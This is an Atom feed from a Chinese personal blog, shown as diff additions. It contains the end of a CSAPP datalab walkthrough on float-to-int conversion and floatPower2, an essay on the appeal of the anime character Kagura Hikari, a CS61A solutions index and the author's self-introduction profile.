+<p>非规格化：<code>exp == 0</code>，其表示值范围为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \le x &lt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，强制类型转换为<code>int</code>则直接向0取整返回0。可以合并到下述E&lt;0的情况。</p>
+<p>规格化：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo>=</mo><mo>(</mo><mo>−</mo><mn>1</mn><msup><mo>)</mo><mi>s</mi></msup><mo>×</mo><mi>M</mi><mo>×</mo><msup><mn>2</mn><mi>E</mi></msup></mrow><annotation encoding="application/x-tex">V=(-1)^s \times M \times 2^E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span></span></span></span></span></span></span></span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>=</mo><mi>e</mi><mo>−</mo><mi>B</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>=</mo><mi>e</mi><mo>−</mo><mn>127</mn></mrow><annotation encoding="application/x-tex">E=e-Bias=e-127</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">i</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">7</span></span></span></span>。</p>
+<p>当<code>E&lt;0</code>时，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo>&lt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">V&lt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，直接返回0；</p>
+<p>当<code>E&gt;=31</code>时，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo>&gt;</mo><mi>T</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo>=</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">V&gt;Tmax=2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，特判返回0x80000000u即<code>1&lt;&lt;31</code>。</p>
+<p>接下来处理其他情况。</p>
+<p>在相乘之前给M补回隐含的1，即 <code>frac |= 0x800000;</code>，则包含一开始的掩码操作在内，我们此时取得的<code>unsigned frac</code> 是一个以1开头的24位的unsigned，相当于已经给规格化公式所需的值<code>M(1 &lt;= M &lt; 2)</code> 左移了23位。</p>
+<p>即当<code>E &gt;= 24</code>时，我们已左移的23位还需继续左移，即再左移<code>E - 23</code>位，总共左移了<code>E</code>位，满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>×</mo><msup><mn>2</mn><mi>E</mi></msup></mrow><annotation encoding="application/x-tex">M \times 2^E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span></span></span></span></span></span></span></span></span></span></span>，</p>
+<p>当<code>E &lt;= 23</code>时，我们将已左移的23位回退<code>23 - E</code>位，相当于实际左移了<code>E</code>位，满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>×</mo><msup><mn>2</mn><mi>E</mi></msup></mrow><annotation encoding="application/x-tex">M \times 2^E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span></span></span></span></span></span></span></span></span></span></span>。</p>
+<p>最后根据符号s返回相应正负值即可。</p>
+<h3 id="floatpower2">floatPower2</h3>
+<p>要注意到答案<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">2^x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span>的值一定大于0，则它能取到的最小值是非规格化数表示的最小正值，最大值是规格化数表示的最大正值。</p>
+<p>先考虑非规格化数。考虑除0之外最小的非规格化数，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>=</mo><mn>1</mn><mo>−</mo><mn>127</mn><mo>=</mo><mo>−</mo><mn>126</mn></mrow><annotation encoding="application/x-tex">E=1-127=-126</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">2</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord">2</span><span class="mord">6</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>r</mi><mi>a</mi><mi>c</mi><mo>=</mo><msup><mn>2</mn><mrow><mo>−</mo><mn>23</mn></mrow></msup></mrow><annotation encoding="application/x-tex">frac=2^{-23}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span>， 此时<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo>=</mo><msup><mn>2</mn><mrow><mo>−</mo><mn>126</mn></mrow></msup><mo>×</mo><msup><mn>2</mn><mrow><mo>−</mo><mn>23</mn></mrow></msup><mo>=</mo><msup><mn>2</mn><mrow><mo>−</mo><mn>149</mn></mrow></msup></mrow><annotation encoding="application/x-tex">V=2^{-126} \times 2^{-23}=2^{-149}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span><span class="mord mtight">4</span><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></span>即为可以表示的最小值。因此如果<code>x &lt; -149</code>，则精度太高、无法表示，直接返回<code>0</code>。</p>
+<p>其余非规格化数的情况在精度范围内，<code>frac = x + 149</code>，此时要表示成float串，只有frac部分，表示的值恰好为实际值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span></span></span></span>，$V=2^{-126} \times 2^{-23} \times 2<sup>x=2</sup>{x-149} $，故返回 <code>1 &lt;&lt; (x + 149)</code> 。直到左移至exp不为0，所以这种情况的边界条件是<code> x &lt;= -127</code>。</p>
+<p>当<code>x + 149 &gt;= 23</code>即<code>x &gt;= -126</code>时，开始规格化表示。对于规格化数，能表示的最大数的数量级应为exp除了第一位以外全为1、即<code>exp==127</code>，因此当<code>x &gt; 127</code>时返回+INF即<code>0xFF &lt;&lt; 23</code>。</p>
+<p>其余规格化数的情况是<code>-126 &lt;= x &lt;= 127</code>，此时要表示成float串，<code>e = E + 127 = x + 127</code>，而frac部分均为0，即返回<code>(x + 127) &lt;&lt; 23</code>。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[为什么神乐光很萌？]]></title>
+        <id>https://meredith2328.github.io/post/KaguraHikari/</id>
+        <link href="https://meredith2328.github.io/post/KaguraHikari/">
+        </link>
+        <updated>2024-01-07T15:59:53.000Z</updated>
+        <content type="html"><![CDATA[<p>by. <s>看少女歌剧看魔怔了的</s>十派</p>
+<p>如何界定神乐光的萌点？<br>
+首先可以盖棺定论地说，神乐光绝对不是“傲娇”一词就能概括的。<br>
+事实上，对比于“傲娇”一词的起源、eva某人 <s>（明日香）</s> ，神乐光无论傲和娇都是“不称职”的。假定傲娇一词针对的对象是其在意的人，eva对应男主，神乐光对应华恋，神乐光从来没有对华恋冷言相向，也没有在突破特定阈值时突然展现出“娇”的姿态。<br>
+神乐光平日里始终是冷冷、捉摸不透的表情，虽然这种情况下更可能是在发呆。或许用“谜语人”一词更好形容她——带有电波感又内心坚定的无口天然少女，这是我想到的不吝用词的界定。<br>
+而在各个用词中选取表现得最明显的，是天然、还是坚定？我说不清楚。</p>
+<p>为了把握用词之间的细微差异，我参考了萌百的相关记述，其中“冷娇”“凛娇”“率直娇”三个词引起了我的注意。<br>
+其中“率直娇”一词是首先可以排除的。因为其重点更在于“率直”，即不拐弯抹角、不带羞涩的直球心情表达，与神乐光的“谜语人”感不相匹配。<br>
+神乐光平日更多倾向于将自己内心中的深层想法藏起来，以自认为聪明但其实笨拙的方式做“暗示”，一直到剧场版Revue里彻底被闹钟妹撕下所有伪装之时才会表达自己内心最真实的看法。<br>
+<s>（华恋对其的误解与误解的消除是全剧的基础，但是这种不坦率感好令人来气啊kora！）</s></p>
+<p>“凛娇”一词同样可以排除。我对其定义的理解是事实上对恋爱有向往、有需求，但不会处于“恋爱脑”的状态，整体由理智控制。<br>
+神乐光不属于此类，因为她做的决定的行为事实上是“建构在特定情感倾向上的理性”，更详细的说是其做长期决定具有喜好色彩、而短期决定情感和理智参半。<br>
+（这种某种意义上“平易近人”而非“高高在上”的设定也是一大萌点，确信）<br>
+（理智占绝对主导的案例比如人设为军人或者退伍军人，情感占绝对主导的案例比如近年兴起的废萌；这两类又是另外的魅力了，不多赘述）</p>
+<p>那么排除到最后，我认为较贴近的应当是“冷娇”一词。近年的番剧不乏此类刻画，诸如樱花庄的真白、京吹的丽奈都有相关体现。<br>
+其重要特点需要说明。为了动画剧情合理化，其中“冷”字往往通过角色的高个人能力加以包装，从而不至于给观众以“莫名其妙”的第一印象。<br>
+除此之外，为了动画观感，往往会刻意强调“娇”的部分、而把“冷”的部分作为“引线”或者“调味剂”，从而营造反差萌，凸显其“娇”的价值。<br>
+其运作模式在近些年来与“傲娇”都广泛为动画业界所采用。</p>
+<p>尽管如此，我们仍有疑问：“傲娇”难以塑造，那“冷娇”怎么塑造更好？<br>
+补充说明一下“傲娇”塑造之难，并辨析一下二者的区别。“傲娇”一词同样以高个人能力作为价值包装，但是这一点与“傲”的设定存在严重冲突：主角某方面“不如”则傲娇才有“傲”的资本；但是主角“不如”又如何发生进一步联系与情节推进呢？<br>
+由此衍生出的探索主要分为“偏科系”或者“成长系”两类，后者事实上在剧情发展后期会将“傲”字直接磨掉，让人怀疑是否也将人物性格设定视作“打怪升级从而解锁新剧情”的养成类游戏；前者或许能将“傲”和“娇”两方面均有所保留，只是在塑造效果颇有割裂感、甚至精分感。</p>
+<p>关于“冷娇塑造之难”以及“为什么神乐光很萌”，我们不得不回看之前在分析人物特点时写到、但是在界定时忽略了的一个词：</p>
+<blockquote>
+<p><strong>天然</strong></p>
+</blockquote>
+<p>毫无疑问的是，如果失去这个特点，则神乐光立马会化为“莫名其妙”又“标签化”的所谓“冷娇”群体中的芸芸众生。神乐光的“天然”感才是其最大的萌点。</p>
+<p>我们不妨“绕远一点”，看看更本质的问题。<br>
+笔者个人很久以前觉得有一些问题很有趣：<br>
+1.“演唱会”相比于精心制作的“录音”的魅力在哪里？<br>
+这一条或许很好回答，但随着我们的继续追问，问题会越来越有趣：<br>
+2.“翻唱”的魅力在哪里？<br>
+或者更加细化一点的问题，<br>
+3.“不够成熟的作品”的魅力在哪里？<br>
+如果能够回答清楚第3个问题，就能理解笔者为什么对“日常番”有长久的喜爱了，也能够理解为什么神乐光的“天然”是其最大的萌点、而不是其他了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CS61A 2020summer题解]]></title>
+        <id>https://meredith2328.github.io/post/cs61a-2020summer-ti-jie/</id>
+        <link href="https://meredith2328.github.io/post/cs61a-2020summer-ti-jie/">
+        </link>
+        <updated>2023-07-30T14:09:06.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>观前提醒：虽说自称是题解，但是有相当一部分题目摸鱼摸了过去，写过的部分质量也很一般。<br>
+望dalao们不吝赐教。</p>
+</blockquote>
+<h2 id="更新进度">更新进度</h2>
+<ol>
+<li>Labs: Lab07√（7.29）</li>
+<li>Homework: HW05√ （7.30）</li>
+<li>Projects: Hog√ Cats√ （7.27）<br>
+（ps. 比较懒，没有写Discussion部分，请谅解</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[自设]]></title>
+        <id>https://meredith2328.github.io/post/zi-she/</id>
+        <link href="https://meredith2328.github.io/post/zi-she/">
+        </link>
+        <updated>2022-08-12T17:33:33.000Z</updated>
+        <summary type="html"><![CDATA[<p>人设绝赞完善中！</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>人设绝赞完善中！</p>
+<!-- more -->
+<blockquote>
+<ol>
+<li>资料来源是萌娘百科：meredith2328。</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>由于萌娘百科服务器反复502，被迫换地方写线性博客。想自己搭一个。</p>
+</blockquote>
+<blockquote>
+<ol start="2">
+<li>绿底初音的来源是 やっちゃいましたね？ - LamazeP/初音ミク</li>
+</ol>
+</blockquote>
+<blockquote>
+<p>不过其实基本没听过LamazeP的歌曲，只是这个初音比较可爱所以存了图。</p>
+</blockquote>
+<blockquote>
+<ol start="3">
+<li>最后一次更新是17:00，2024.1.31。</li>
+</ol>
+</blockquote>
+<h1 id="基本资料">基本资料</h1>
+<ul>
+<li>
+<p><strong>名称</strong> <strong>十派/10π/10pi</strong>（主要使用）/<strong>Meredith2328</strong>（Minecraft正版账号ID）</p>
+</li>
+<li>
+<p><strong>别号</strong>    Mere, Meredith, TS_Meredith（Minecraft盗版账号ID），Seclusion.（前QQ昵称），Halation.（前QQ昵称）</p>
+</li>
+<li>
+<p><strong>血型</strong> 希腊奶 <s>(不明</s></p>
+</li>
+<li>
+<p><strong>星座</strong>    双鱼座desu</p>
+</li>
+<li>
+<p><strong>年龄</strong>    19.8</p>
+</li>
+<li>
+<p><strong>身高</strong>    183±0.5(现在锁死183了</p>
+</li>
+<li>
+<p><strong>萌点</strong>    吐槽，折腾/较真（轻度强迫症），社交软件依赖症，音游，dd，<s>⑨</s>，摸鱼，数学</p>
+</li>
+<li>
+<p><strong>自述</strong>    一个看见好玩的事情就会兴奋起来的普通人</p>
+</li>
+<li>
+<p><strong>好友</strong> 一切志同道合的同好们~</p>
+</li>
+<li>
+<p><strong>敌人</strong> 任何钓鱼行为及其发出者，无论是否钩直饵咸</p>
+</li>
+<li>
+<p><strong>相关人物</strong> 不同时空 <s>（设定）</s> 的十派</p>
+</li>
+</ul>
+<h1 id="部分标签">部分标签</h1>
+<ul>
+<li>
+<p><strong>BiliBili</strong> 该用户是B站的用户，Ta在B站被称为<em>十派</em>。</p>
+</li>
+<li>
+<p><strong>学生党</strong> 十派是学生党，只有在星期天有空时才能进行萌娘百科的维护工作。（真的吗</p>
+</li>
+<li>
+<p><strong>咕?</strong>    该用户已经变成了一只快乐的鸽子</p>
+</li>
+<li>
+<p><strong>强迫症</strong>   这位用户有一点点强迫症，偶尔会有过度专注于小事的情况。</p>
+</li>
+<li>
+<p><strong>莫谈国事</strong>  对于各时间段各地发生的各种事情，该用户三缄其口。</p>
+</li>
+<li>
+<p><strong>小编辑</strong>   这名用户擅长毫无意义的小编辑</p>
+</li>
+<li>
+<p><strong>随便看看</strong>  这名用户喜欢从多个来源处收集资料。</p>
+</li>
+<li>
+<p><strong>借鉴</strong>    这个用户喜欢借鉴其他条目，并加以改善。借明于鉴以照之，则寸分可得而察也</p>
+</li>
+<li>
+<p><strong>VOCALOID</strong>  这位用户喜欢听VOCALOID歌曲。</p>
+</li>
+<li>
+<p><strong>Minecraft</strong> 这名用户来自只有方块的世界</p>
+</li>
+<li>
+<p><strong>音游狗</strong> 该用户是一名音乐游戏玩家。</p>
+</li>
+</ul>
+<p>⋯⋯  等等等等（以下省略一万字以上）</p>
+<h1 id="详细介绍">详细介绍</h1>
+<p>对以上内容做一定补充。</p>
+<p>这一部分是一边听 <em><strong>向着无尽之灰/限りなく灰色へ</strong></em> 一边写的。</p>
+<h2 id="animation-番剧">Animation 番剧</h2>
+<p>大约是2020年10月开始相对较大规模地看番剧，该属性持续至今。<br>
+看番列表中“日常番”类型相对较多。<br>
+几乎没有接触过战斗番等类型。</p>
+<p>相比于“追番”更喜欢“补番”，所以会把一部分番点了红心之后放置到更完再看。<s>(也可能一直不看</s></p>
+<p><s>比如<em>赛马娘2</em></s>（2024.1.7补：虽然依旧没有补 <em>赛马娘第一季和第二季</em> ，但是<em>ROAD TO THE TOP</em> 非常好看！都去看！！）</p>
+<p>印象深刻的番/动画有：</p>
+<p>（2024.1.7补：由于看番量明显增加，这一部分大概重写了一遍，只保留了“影响”比较明显的作品）</p>
+<ul>
+<li>
+<p><em>猫和老鼠</em>（2019.7看，第一次接触到精巧的音画配合），</p>
+</li>
+<li>
+<p><em>My Little Pony</em>（九季全，及<em>Equestria Girls</em>的所有动画部分及短片，2020.2，Friendship is magic!!），</p>
+</li>
+<li>
+<p><em><strong>四月是你的谎言</strong></em>（2020.10，是第一次真正意义上接触到日本动漫作品，影响深远；2024.1正在二刷）</p>
+</li>
+<li>
+<p><em>Lovelive! 虹咲学园学园偶像同好会</em> （2020.11）（第一次接触偶像类企划，为后续接触 <em>BanG Dream!</em> 并踩入后续的音游大坑埋下伏笔）</p>
+</li>
+<li>
+<p><em><strong>冰菓</strong></em>（2021.3，连续刷了两遍）</p>
+</li>
+<li>
+<p><em>吹响吧！上低音号</em>、<em>利兹与青鸟</em>（2022.7，记住了音乐<s>和黄大叔的颜艺</s>，模模糊糊有一点剧情的印象）</p>
+</li>
+<li>
+<p><em><strong>少女歌剧</strong></em> （2023.11，完美符合个人对带有日常色彩、注重表现手法、音乐剧、bananice等等的一系列爱好，还符合一些对生活的想法和态度、甚至个人生活经历也有相似之处，印象相当深刻）</p>
+</li>
+</ul>
+<p>ps. 时间是凭印象摸的，非常粗略，极有可能存在高达几个月的误差。</p>
+<p>只列入部分，具体参见<a href="https://space.bilibili.com/30840393/bangumi">bilibili：十派的追番列表</a></p>
+<p>（不过其实追番并不等于看番，所以总量200左右是水水水出一片大海，但看过的占追番比例<br>
+还是不低的</p>
+<h2 id="关于qq头像">关于QQ头像</h2>
+<ul>
+<li>
+<p><strong>神乐光</strong><br>
+（少女歌剧）<br>
+2023.11 但是她实在是太可爱了，就不小心多截了几张循环使用。<br>
+<a href="https://meredith2328.github.io/post/KaguraHikari">关于神乐光的萌点</a></p>
+</li>
+<li>
+<p><strong>七草荠</strong><br>
+（彻夜之歌）<br>
+对不以比较为目的、而是做一些有意义的事情的生活一如既往地喜爱。这一点从看四谎时就意识到了。</p>
+</li>
+<li>
+<p><strong>黑川赤音/黑川茜</strong><br>
+（我推的孩子）<br>
+侧写能力留下了比较深的印象。</p>
+</li>
+<li>
+<p><strong>东云绘名</strong><br>
+（Project Sekai）<br>
+2022.8 今年一月那会超累，但是看到Enana的笑容有被治愈到一点点。所以再次换头像，现在是Enana的表情包。<br>
+（结果这张Enana衍生出一些故事，这又是后话了）</p>
+</li>
+<li>
+<p><strong>安乐冈花火</strong><br>
+（人渣的本愿）<br>
+大约是感慨于这部作品描写的“共依存感”。<br>
+以及安乐冈女儿蛮可爱的，很符合我对吐槽役+短发的爱好<s>xp</s>。</p>
+</li>
+<li>
+<p><strong>折木奉太郎</strong><br>
+（冰菓）<br>
+2021.3 将QQ使用了约10年（初中时曾换成其他头像，但后来换了回来）的Jerry（<em>猫和老鼠</em>）头像换成了折木奉太郎（<em>冰菓</em>）。因为生活发生了不小的改变。</p>
+</li>
+<li>
+<p><strong>Jerry/杰瑞</strong><br>
+（猫和老鼠）<br>
+小孩子不懂事放着玩的。</p>
+</li>
+</ul>
+<h2 id="comiclight-novel-漫画轻小说">Comic+Light Novel 漫画+轻小说</h2>
+<p>很少看漫画与轻小说，但是很喜欢漫画这种艺术形式。</p>
+<p><strong>漫画</strong></p>
+<ul>
+<li>
+<p><strong>我推的孩子</strong> 趁上番剧之前看的，一直看到最新连载，认为是蛮惊异的作品，印象也比较深刻（</p>
+</li>
+<li>
+<p><strong>彻夜之歌</strong> 好玩。</p>
+</li>
+<li>
+<p><strong>电锯人</strong> 2022.8友人推荐，看了一部分，好玩，后续有机会继续补w</p>
